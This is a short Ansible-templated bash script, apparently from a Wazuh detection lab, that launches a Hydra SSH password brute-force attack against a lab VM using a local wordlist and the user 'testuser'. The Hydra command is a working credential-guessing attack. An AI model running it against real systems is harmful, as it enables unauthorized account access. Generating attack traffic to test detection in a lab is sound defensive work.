#!/bin/bash
# run_attack.sh - generated by Ansible from run_attack.sh.j2
# Runs a Hydra SSH brute force attack against the target VM

TARGET_IP="{{ hostvars[groups['wazuh_agents'][0]]['ansible_host'] }}"
WORDLIST="/home/vagrant/wordlist.txt"

echo "[*] Starting Hydra brute force against $TARGET_IP ..."
hydra -l testuser \
      -P "$WORDLIST" \
      ssh://"$TARGET_IP" \
      -t 2 -V -f

echo "[*] Attack complete."